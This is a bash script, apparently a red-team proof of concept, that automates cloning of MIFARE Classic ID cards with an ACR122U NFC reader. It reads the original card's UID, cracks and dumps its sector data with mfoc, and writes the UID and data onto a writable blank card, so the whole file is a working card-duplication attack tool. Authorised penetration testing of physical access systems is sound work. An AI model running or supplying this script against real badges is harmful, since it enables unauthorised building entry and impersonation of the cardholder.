#!/bin/bash
#set -x
#------------------------------------------------------
# APO 05/2021 - CLONE ID CARD POC
#------------------------------------------------------
# NFC Card reader/writer used for this POC:
# Type: ACR122U-A9
# Product: ACR122U PICC Interface
# Manufacturer: Advanced Cardsystems Ltd. (ACS)
#
# idVendor=072f, idProduct=2200, bcdDevice= 2.07
# device strings: Mfr=1, Product=2, SerialNumber=0
#
# Some good commands to know about:
#
# READ UID FROM CARD:  sudo nfc-anticol
# WRITE UID TO CARD:   sudo nfc-mfsetuid 1234ACD
# CLEAN (FORMAT) CARD: sudo nfc-mfsetuid -f
#
#------------------------------------------------------
# Banner for the 1337'ish ness
#------------------------------------------------------
clear
cat <<EOF
   _____
  |A .  | _____
  | /.\ ||A ^  | _____
  |(_._)|| / \ ||A _  | _____
  |  |  || \ / || ( ) ||A_ _ |
  |____V||  .  ||(_'_)||( v )|
         |____V||  |  || \ / |
                |____V||  .  |
                       |____V|

 Dubex Redteam Card Cloner utility

EOF
#----------------------------------------
# VARIABLES
#----------------------------------------
SAVE_CARD_DUMP_FILES_HERE="./card_data"
WRITE_SIDE="A" # Can be A or B
#----------------------------------------
# PRE:
#----------------------------------------
if [ $(/usr/bin/id -u) -ne 0 ]; then
 printf " ### ERROR - You must run this script with sudo or as the user root!\n\n"
 exit 1
fi

if [ "$(/bin/uname --kernel-release)" != "4.18.3" ]; then
 echo ""
 echo " ### INFO - The Linux kernel must be this version or higher: Linux edge 4.18.3"
 echo "            Otherwise the native NFC card reader will crash (see it with the command dmesg)"
 echo ""
fi
#
if [ ! -d ${SAVE_CARD_DUMP_FILES_HERE} ]; then
 mkdir -p -m 0700 ${SAVE_CARD_DUMP_FILES_HERE} >/dev/null 2>&1
fi
#
PROGRAM="$(/usr/bin/basename ${0})"
MFOC="/usr/local/bin/mfoc"           # apt-get install mfoc
ANTICOL="/usr/bin/nfc-anticol"       # apt-get install libnfc-examples
NFC_POLL="/usr/bin/nfc-poll"         # apt-get install libnfc-examples
NFC_SETUID="/usr/bin/nfc-mfsetuid"   # apt-get install libnfc-examples
NFC_LIST="/usr/bin/nfc-list"         # apt-get install libnfc-bin
NFC_CLASSIC="/usr/bin/nfc-mfclassic" # apt-get install libnfc-bin
TIMESTAMP="$(date '+%Y_%m_%d_%H%M%S')"
#
for UTIL in ${MFOC} ${ANTICOL} ${NFC_LIST} ${NFC_POLL} ${NFC_SETUID} ${NFC_CLASSIC}; do
 if [ ! -x ${UTIL} ];then
  echo " ### ERROR - Utility ${UTIL} not found!"
 printf "\n Help to installing the missing utilities:\n
 /usr/local/bin/mfoc    # apt-get install mfoc
 /usr/bin/nfc-mfclassic # apt-get install libnfc-bin
 /usr/bin/nfc-list      # apt-get install libnfc-bin
 /usr/bin/nfc-anticol   # apt-get install libnfc-examples
 /usr/bin/nfc-mfssetuid # apt-get install libnfc-examples
 /usr/bin/nfc-poll      # apt-get install libnfc-examples\n\n"
  exit 1
 fi
done
#----------------------------------------
# FUNCTIONS
#----------------------------------------
function detect_card_reader() {
 CARD_READER_FOUND=0
 while [ ${CARD_READER_FOUND} -eq 0 ]; do
  READER_DATA="$(${NFC_LIST} 2>&1)"
  CARD_READER_FOUND=$(echo "${READER_DATA}"|grep -c -E "^NFC device:.*opened$")
 sleep 1
 done
 return 0
}
#----------------------------------------
# MAIN
#----------------------------------------
printf " %-55s" "Detecting card reader.."
detect_card_reader
echo "[OK]"
#
READ_CARD_LOOP=1
while [ ${READ_CARD_LOOP} -eq 1 ]; do
 printf " %-55s" "Place the card to clone on the reader now.."
 read_uid_success="FALSE"
 while [ "${read_uid_success}" == "FALSE" ]; do
  DATA="$(${ANTICOL} 2>&1)"
  FAILED=$(echo ${DATA}|grep -c "Error: No tag available")
  if [ ${FAILED} -eq 0 ]; then
   CARD_UID=$(echo "${DATA}"|grep "UID:"|awk '{print $2}')
   CARD_ATQA=$(echo "${DATA}"|grep "ATQA:"|awk '{print $2}')
   CARD_SAK=$(echo "${DATA}"|grep "SAK:"|awk '{print $2}')
   if [ "${CARD_UID}" == "" -o "${CARD_ATQA}" == "" -o "${CARD_SAK}" == "" ]; then
    sleep .5
   else
    read_uid_success="SUCCESS"
   fi
  fi
 done
 echo "[OK]"
 #
 printf "\n ##### CARD DATA DUPLICATION IN PROGRESS ##### (this often takes up to 75 seconds)"
 printf "\n %-55s" "$(date) Started  cloning of ID-Card with UID: ${CARD_UID} (ATQA:${CARD_ATQA}/SAK:${CARD_SAK}) "
 ${MFOC} -O ${SAVE_CARD_DUMP_FILES_HERE:-.}/${CARD_UID}.${TIMESTAMP}.mfd > ${PROGRAM}.log 2>${PROGRAM}.error
 if [ $? -ne 0 ]; then
  printf "\n ##### CARD DATA DUPLICATION FAILED !!!! #####\n\n"
  READ_CARD_LOOP=1
 else
  READ_CARD_LOOP=0
  printf "\n %-55s" "$(date) Finished cloning of ID-Card with UID: ${CARD_UID} (ATQA:${CARD_ATQA}/SAK:${CARD_SAK}) "
 fi
done # LOOP IF READ FAILED
#-------------------------------------------------
# WAIT FOR REPLACED CARD
#-------------------------------------------------
sleep .5
printf "\n\n %-55s" "Remove the original card.. "
CARD_REMOVED=0
while [ ${CARD_REMOVED} -eq 0 ]; do
 ${NFC_POLL} > /dev/null 2>&1
 if [ $? -eq 0 ]; then
  CARD_REMOVED=1
 fi
done
echo "[OK]"
#-------------------------------------------------
# WAIT FOR REPLACED CARD
#-------------------------------------------------
ALLOW_OVERWRITE=0
NEW_UID="${UID}"
while [ ${ALLOW_OVERWRITE} -eq 0 ]; do
printf " %-55s" "Place a new blank card on the NFC Writer.."
 read_new_uid_success="FALSE"
 while [ "${read_new_uid_success}" == "FALSE" ]; do
  NEW_DATA="$(${ANTICOL} 2>&1)"
  NEW_FAILED=$(echo ${NEW_DATA}|grep -c "Error: No tag available")
  if [ ${NEW_FAILED} -eq 0 ]; then
   NEW_CARD_UID=$(echo "${NEW_DATA}"|grep "UID:"|awk '{print $2}')
   NEW_CARD_ATQA=$(echo "${NEW_DATA}"|grep "ATQA:"|awk '{print $2}')
   NEW_CARD_SAK=$(echo "${NEW_DATA}"|grep "SAK:"|awk '{print $2}')
   if [ "${NEW_CARD_UID}" == "" -o "${NEW_CARD_ATQA}" == "" -o "${NEW_CARD_SAK}" == "" ]; then
    sleep .5
   else
    read_new_uid_success="SUCCESS"
   fi
  fi
 done
 if [ "${CARD_UID}" == "${NEW_CARD_UID}" ]; then
  echo "[WARNING]"
  printf "\n ### WARNING - The new card has the same UID as the old card!\n\n"
  read -r -p " QUESTION: Do You want to overwrite this card (y/n)? " response
  if [[ "$response" =~ ^([yY][eE][sS]|[yY])+$ ]]
   then
    ALLOW_OVERWRITE=1
  else
   ALLOW_OVERWRITE=0
   sleep .5
   printf "\n %-55s" "Remove the original card.. "
   CARD_REMOVED=0
   while [ ${CARD_REMOVED} -eq 0 ]; do
    ${NFC_POLL} > /dev/null 2>&1
    if [ $? -eq 0 ]; then
     CARD_REMOVED=1
    fi
   done
   echo "[OK]"
  fi
 else
  echo "[OK]"
  ALLOW_OVERWRITE=1
 fi
done
#----------------------------------------
#  WRITE THE CLONED CARD
#----------------------------------------
printf "\n %-55s" "Writing UID: ${CARD_UID} on the new card "
${NFC_SETUID} ${CARD_UID} >> ${PROGRAM}.log 2>${PROGRAM}.error
if [ $? -ne 0 ]; then
 echo "[ERROR]"
 printf "\n ### ERROR - An error occoured writing UID on the new card!"
 printf "\n             You need special cards to write to sector 0 (it is normally readonly)\n\n"
 exit 1
else
 echo "[OK]"
fi
printf " %-55s\n\n" "Writing (${WRITE_SIDE} side) data from original card:"
${NFC_CLASSIC} w ${WRITE_SIDE} ${SAVE_CARD_DUMP_FILES_HERE:-.}/${CARD_UID}.${TIMESTAMP}.mfd | tee -a ${PROGRAM}.log 2>${PROGRAM}.error
echo ""
#----------------------------------------
# END OF SCRIPT
#----------------------------------------